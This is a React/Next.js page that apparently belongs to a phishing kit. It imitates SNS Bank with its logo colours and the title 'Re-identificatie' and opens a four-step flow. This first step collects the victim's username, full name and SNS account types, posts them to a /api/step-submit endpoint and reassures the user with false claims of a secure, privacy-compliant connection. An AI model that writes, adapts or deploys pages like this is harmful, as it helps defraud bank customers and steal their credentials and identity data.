"use client"

import { useState } from "react"
import { useRouter } from "next/navigation"
import { useForm } from "react-hook-form"
import { zodResolver } from "@hookform/resolvers/zod"
import { z } from "zod"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form"
import { Input } from "@/components/ui/input"
import { Checkbox } from "@/components/ui/checkbox"
import { User, Shield, KeyRound, ArrowLeft, ArrowRight } from "lucide-react"
import { useToast } from "@/hooks/use-toast"

const step1Schema = z.object({
  username: z.string().min(1, "Gebruikersnaam is verplicht"),
  fullName: z.string().min(1, "Volledige naam is verplicht"),
  accountTypes: z.array(z.enum(["private", "business", "creditcard"])).min(1, "Selecteer minimaal één rekeningtype"),
})

type Step1Data = z.infer<typeof step1Schema>

export default function Step1() {
  const router = useRouter()
  const { toast } = useToast()
  const [isSubmitting, setIsSubmitting] = useState(false)

  const form = useForm<Step1Data>({
    resolver: zodResolver(step1Schema),
    defaultValues: {
      username: "",
      fullName: "",
      accountTypes: [],
    },
  })

  const onSubmit = async (data: Step1Data) => {
    setIsSubmitting(true)

    try {
      // Submit step data to API
      const response = await fetch("/api/step-submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ ...data, step: 1 }),
      })

      if (!response.ok) {
        throw new Error("Fout bij verzenden")
      }

      // Store data in localStorage for next steps
      localStorage.setItem("step1Data", JSON.stringify(data))

      toast({
        title: "Stap 1 voltooid",
        description: "Uw inloggegevens zijn opgeslagen. Ga door naar stap 2.",
      })

      router.push("/step-2")
    } catch (error) {
      toast({
        title: "Fout bij verzenden",
        description: "Er is een fout opgetreden. Probeer het opnieuw.",
        variant: "destructive",
      })
    } finally {
      setIsSubmitting(false)
    }
  }

  const handleBack = () => {
    router.push("/")
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-orange-50 to-white">
      {/* Header with Progress */}
      <header className="bg-white border-b border-gray-200 shadow-sm">
        <div className="max-w-4xl mx-auto px-4 py-6">
          <div className="flex items-center justify-between mb-4">
            <div className="flex items-center space-x-4">
              <div className="w-12 h-12 bg-gradient-to-br from-orange-500 to-orange-600 rounded-lg flex items-center justify-center">
                <span className="text-white font-bold text-lg">SNS</span>
              </div>
              <div>
                <h1 className="text-xl font-bold text-gray-900">SNS Bank</h1>
                <p className="text-orange-600 text-sm">Re-identificatie</p>
              </div>
            </div>
          </div>

          {/* Progress Indicator */}
          <div className="flex items-center justify-center">
            <div className="flex items-center space-x-4">
              <div className="flex items-center">
                <div className="w-10 h-10 bg-orange-500 text-white rounded-full flex items-center justify-center text-sm font-bold">
                  1
                </div>
                <span className="ml-3 text-sm font-medium text-orange-600">Inloggen</span>
              </div>
              <div className="w-12 h-px bg-gray-300"></div>
              <div className="flex items-center">
                <div className="w-10 h-10 bg-gray-200 text-gray-500 rounded-full flex items-center justify-center text-sm font-bold">
                  2
                </div>
                <span className="ml-3 text-sm text-gray-500">Persoonlijke gegevens</span>
              </div>
              <div className="w-12 h-px bg-gray-300"></div>
              <div className="flex items-center">
                <div className="w-10 h-10 bg-gray-200 text-gray-500 rounded-full flex items-center justify-center text-sm font-bold">
                  3
                </div>
                <span className="ml-3 text-sm text-gray-500">Aanvullende info</span>
              </div>
              <div className="w-12 h-px bg-gray-300"></div>
              <div className="flex items-center">
                <div className="w-10 h-10 bg-gray-200 text-gray-500 rounded-full flex items-center justify-center text-sm font-bold">
                  4
                </div>
                <span className="ml-3 text-sm text-gray-500">Bevestiging</span>
              </div>
            </div>
          </div>
        </div>
      </header>

      <main className="max-w-2xl mx-auto px-4 py-12">
        <Card className="shadow-xl border-0">
          <CardContent className="p-8">
            <div className="text-center mb-8">
              <div className="w-20 h-20 bg-orange-100 rounded-full flex items-center justify-center mx-auto mb-6">
                <User className="h-10 w-10 text-orange-600" />
              </div>
              <h2 className="text-3xl font-bold text-gray-900 mb-3">Inloggen bij SNS</h2>
              <p className="text-gray-600">Voer uw gegevens in voor verificatie</p>
            </div>

            {/* Login Method Info */}
            <div className="bg-blue-50 border border-blue-200 rounded-xl p-6 mb-8">
              <div className="flex items-center space-x-4">
                <div className="w-12 h-12 bg-blue-100 rounded-lg flex items-center justify-center">
                  <KeyRound className="h-6 w-6 text-blue-600" />
                </div>
                <div>
                  <p className="text-blue-900 font-semibold">Gebruikersnaam + Volledige naam</p>
                  <p className="text-blue-700 text-sm">Voor veilige verificatie van uw identiteit</p>
                </div>
              </div>
            </div>

            <Form {...form}>
              <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-8">
                <FormField
                  control={form.control}
                  name="username"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-gray-900 font-semibold text-base">Gebruikersnaam</FormLabel>
                      <FormControl>
                        <Input
                          placeholder="Voer uw gebruikersnaam in"
                          {...field}
                          className="h-14 text-lg border-2 focus:border-orange-500 rounded-lg"
                        />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                <FormField
                  control={form.control}
                  name="fullName"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-gray-900 font-semibold text-base">Volledige naam</FormLabel>
                      <FormControl>
                        <Input
                          placeholder="Voer uw volledige naam in"
                          {...field}
                          className="h-14 text-lg border-2 focus:border-orange-500 rounded-lg"
                        />
                      </FormControl>
                      <FormMessage />
                      <p className="text-sm text-gray-500">Voer uw naam in zoals deze op uw identiteitsbewijs staat</p>
                    </FormItem>
                  )}
                />

                <FormField
                  control={form.control}
                  name="accountTypes"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-gray-900 font-semibold text-base">
                        Rekeningtypes bij SNS Bank
                      </FormLabel>
                      <div className="space-y-4 mt-4">
                        {[
                          {
                            value: "private",
                            label: "Particuliere rekening",
                            desc: "Persoonlijke betaal- en spaarrekening",
                          },
                          {
                            value: "business",
                            label: "Zakelijke rekening",
                            desc: "Bedrijfsrekening en zakelijke diensten",
                          },
                          {
                            value: "creditcard",
                            label: "Creditcard",
                            desc: "SNS Creditcard en gerelateerde producten",
                          },
                        ].map((type) => (
                          <div
                            key={type.value}
                            className="flex items-start space-x-4 p-4 border border-gray-200 rounded-lg hover:border-orange-300 transition-colors"
                          >
                            <Checkbox
                              id={type.value}
                              checked={field.value?.includes(type.value as any)}
                              onCheckedChange={(checked) => {
                                const updatedTypes = checked
                                  ? [...(field.value || []), type.value]
                                  : field.value?.filter((t) => t !== type.value) || []
                                field.onChange(updatedTypes)
                              }}
                              className="mt-1"
                            />
                            <div className="flex-1">
                              <label htmlFor={type.value} className="font-medium text-gray-900 cursor-pointer block">
                                {type.label}
                              </label>
                              <p className="text-sm text-gray-600 mt-1">{type.desc}</p>
                            </div>
                          </div>
                        ))}
                      </div>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                <div className="flex flex-col gap-4 mt-10">
                  <Button
                    type="submit"
                    disabled={isSubmitting}
                    className="w-full bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white h-14 text-lg font-semibold rounded-lg shadow-lg hover:shadow-xl transition-all duration-200"
                  >
                    {isSubmitting ? (
                      <div className="flex items-center space-x-2">
                        <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                        <span>Bezig met opslaan...</span>
                      </div>
                    ) : (
                      <div className="flex items-center space-x-2">
                        <span>Volgende stap</span>
                        <ArrowRight className="h-5 w-5" />
                      </div>
                    )}
                  </Button>
                  <Button
                    type="button"
                    variant="outline"
                    onClick={handleBack}
                    disabled={isSubmitting}
                    className="w-full h-14 border-2 border-gray-300 hover:border-orange-500 text-gray-700 hover:text-orange-600 rounded-lg bg-transparent"
                  >
                    <ArrowLeft className="h-5 w-5 mr-2" />
                    Terug naar hoofdpagina
                  </Button>
                </div>
              </form>
            </Form>

            {/* Security Notice */}
            <div className="mt-8 p-6 bg-gray-50 rounded-xl border border-gray-200">
              <div className="flex items-start space-x-3">
                <Shield className="h-5 w-5 text-gray-600 mt-1 flex-shrink-0" />
                <div>
                  <p className="text-sm text-gray-700">
                    <span className="font-semibold">Veiligheid:</span> Dit is een beveiligde verbinding. Uw gegevens
                    worden veilig verwerkt conform de privacy-wetgeving en direct naar onze beveiligde servers
                    verzonden.
                  </p>
                </div>
              </div>
            </div>
          </CardContent>
        </Card>
      </main>
    </div>
  )
}
